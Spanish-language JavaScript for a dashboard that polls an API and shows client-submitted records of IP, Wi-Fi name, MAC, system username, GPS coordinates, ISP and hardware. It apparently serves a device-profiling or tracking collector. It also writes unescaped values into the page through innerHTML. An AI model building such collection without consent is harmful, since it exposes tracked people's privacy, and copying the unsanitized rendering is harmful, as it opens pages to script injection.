class ServidorUbicacion {
    constructor() {
        this.datos = [];
        this.stats = {
            total: 0,
            hoy: 0,
            paises: new Set(),
            ultimaConexion: null
        };
        this.init();
    }

    async init() {
        // Cargar datos iniciales
        await this.cargarDatos();
        
        // Actualizar cada 5 segundos
        setInterval(() => this.cargarDatos(), 5000);
        
        // Actualizar estadísticas
        this.actualizarStats();
    }

    async cargarDatos() {
        try {
            const response = await fetch('/api/datos');
            if (response.ok) {
                this.datos = await response.json();
                this.renderizarDatos();
                this.actualizarStats();
            }
        } catch (error) {
            console.error('Error cargando datos:', error);
            this.mostrarError();
        }
    }

    renderizarDatos() {
        const container = document.getElementById('datos-container');
        
        if (this.datos.length === 0) {
            container.innerHTML = `
                <div class="no-datos">
                    <i class="fas fa-inbox" style="font-size: 3em; color: #ccc; margin-bottom: 20px;"></i>
                    <p>No hay datos recibidos aún</p>
                    <p style="font-size: 0.9em; color: #999;">Los datos aparecerán aquí automáticamente cuando un cliente envíe información.</p>
                </div>
            `;
            return;
        }

        let html = '';
        this.datos.reverse().forEach(dato => {
            html += this.crearTarjetaDatos(dato);
        });
        
        container.innerHTML = html;
    }

    crearTarjetaDatos(dato) {
        const fecha = new Date(dato.timestamp);
        const fechaFormateada = fecha.toLocaleString('es-ES', {
            day: '2-digit',
            month: '2-digit',
            year: 'numeric',
            hour: '2-digit',
            minute: '2-digit'
        });

        return `
            <div class="datos-item">
                <div class="datos-header">
                    <div class="timestamp">
                        <i class="fas fa-clock"></i>
                        ${fechaFormateada}
                    </div>
                    <div class="client-info">
                        <i class="fas fa-desktop"></i>
                        ${dato.client_ip}
                    </div>
                </div>
                
                <div class="secciones">
                    <div class="seccion">
                        <h3><i class="fas fa-network-wired"></i> Conexión</h3>
                        <div class="dato">
                            <span class="dato-label">Desde:</span>
                            <span class="dato-value">${dato.conexion.desde}</span>
                        </div>
                        <div class="dato">
                            <span class="dato-label">Gateway:</span>
                            <span class="dato-value">${dato.conexion.gateway}</span>
                        </div>
                        <div class="dato">
                            <span class="dato-label">Red WiFi:</span>
                            <span class="dato-value">${dato.conexion.wifi}</span>
                        </div>
                        <div class="dato">
                            <span class="dato-label">Tipo:</span>
                            <span class="dato-value">${dato.conexion.tipo || 'N/A'}</span>
                        </div>
                        <div class="dato">
                            <span class="dato-label">Adaptador:</span>
                            <span class="dato-value">${dato.conexion.adaptador}</span>
                        </div>
                        <div class="dato">
                            <span class="dato-label">MAC:</span>
                            <span class="dato-value">${dato.conexion.mac}</span>
                        </div>
                        <div class="dato">
                            <span class="dato-label">DNS:</span>
                            <span class="dato-value">${dato.conexion.dns}</span>
                        </div>
                    </div>
                    
                    <div class="seccion">
                        <h3><i class="fas fa-user"></i> Usuario y Sistema</h3>
                        <div class="dato">
                            <span class="dato-label">Usuario:</span>
                            <span class="dato-value">${dato.usuario_sistema.usuario}</span>
                        </div>
                        <div class="dato">
                            <span class="dato-label">PC:</span>
                            <span class="dato-value">${dato.usuario_sistema.pc}</span>
                        </div>
                        <div class="dato">
                            <span class="dato-label">SO:</span>
                            <span class="dato-value">${dato.usuario_sistema.so}</span>
                        </div>
                    </div>
                    
                    <div class="seccion">
                        <h3><i class="fas fa-globe-americas"></i> Información Geográfica</h3>
                        <div class="dato">
                            <span class="dato-label">IP:</span>
                            <span class="dato-value">${dato.geografica.ip}</span>
                        </div>
                        <div class="dato">
                            <span class="dato-label">Ciudad:</span>
                            <span class="dato-value">${dato.geografica.ciudad}</span>
                        </div>
                        <div class="dato">
                            <span class="dato-label">País:</span>
                            <span class="dato-value">${dato.geografica.pais}</span>
                        </div>
                        <div class="dato">
                            <span class="dato-label">Coordenadas:</span>
                            <span class="dato-value">${dato.geografica.coordenadas}</span>
                        </div>
                        <div class="dato">
                            <span class="dato-label">ISP:</span>
                            <span class="dato-value">${dato.geografica.isp}</span>
                        </div>
                    </div>
                    
                    <div class="seccion">
                        <h3><i class="fas fa-microchip"></i> Hardware</h3>
                        <div class="dato">
                            <span class="dato-label">CPU:</span>
                            <span class="dato-value">${dato.hardware.cpu}</span>
                        </div>
                        <div class="dato">
                            <span class="dato-label">GPU:</span>
                            <span class="dato-value">${dato.hardware.gpu}</span>
                        </div>
                        <div class="dato">
                            <span class="dato-label">RAM:</span>
                            <span class="dato-value">${dato.hardware.ram}</span>
                        </div>
                        <div class="dato">
                            <span class="dato-label">Disco:</span>
                            <span class="dato-value">${dato.hardware.disco}</span>
                        </div>
                        <div class="dato">
                            <span class="dato-label">Placa Base:</span>
                            <span class="dato-value">${dato.hardware.placa}</span>
                        </div>
                        <div class="dato">
                            <span class="dato-label">Fabricante:</span>
                            <span class="dato-value">${dato.hardware.fabricante}</span>
                        </div>
                    </div>
                </div>
            </div>
        `;
    }

    actualizarStats() {
        // Calcular estadísticas
        this.stats.total = this.datos.length;
        this.stats.paises = new Set();
        this.stats.hoy = 0;
        this.stats.ultimaConexion = null;

        const hoy = new Date().toDateString();
        
        this.datos.forEach(dato => {
            const fechaDato = new Date(dato.timestamp).toDateString();
            
            if (fechaDato === hoy) {
                this.stats.hoy++;
            }
            
            if (dato.geografica && dato.geografica.pais) {
                this.stats.paises.add(dato.geografica.pais);
            }
            
            if (!this.stats.ultimaConexion || new Date(dato.timestamp) > new Date(this.stats.ultimaConexion)) {
                this.stats.ultimaConexion = dato.timestamp;
            }
        });

        // Actualizar UI
        document.getElementById('total-conexiones').textContent = this.stats.total;
        document.getElementById('hoy-conexiones').textContent = this.stats.hoy;
        document.getElementById('paises-unicos').textContent = this.stats.paises.size;
        
        if (this.stats.ultimaConexion) {
            const fecha = new Date(this.stats.ultimaConexion);
            document.getElementById('ultima-conexion').textContent = fecha.toLocaleTimeString('es-ES', {
                hour: '2-digit',
                minute: '2-digit'
            });
        } else {
            document.getElementById('ultima-conexion').textContent = '--:--';
        }
    }

    mostrarError() {
        const container = document.getElementById('datos-container');
        container.innerHTML = `
            <div class="no-datos">
                <i class="fas fa-exclamation-triangle" style="font-size: 3em; color: #ff6b6b; margin-bottom: 20px;"></i>
                <p>Error cargando datos</p>
                <p style="font-size: 0.9em; color: #999;">Verifica que el servidor esté funcionando correctamente.</p>
            </div>
        `;
    }
}

// Inicializar cuando el DOM esté listo
document.addEventListener('DOMContentLoaded', () => {
    new ServidorUbicacion();
});

// Función para enviar datos (usada por el cliente)
async function enviarDatos(datos) {
    try {
        const response = await fetch('/', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/octet-stream'
            },
            body: datos
        });
        
        if (response.ok) {
            console.log('Datos enviados correctamente');
            return true;
        } else {
            console.error('Error enviando datos');
            return false;
        }
    } catch (error) {
        console.error('Error de conexión:', error);
        return false;
    }
}
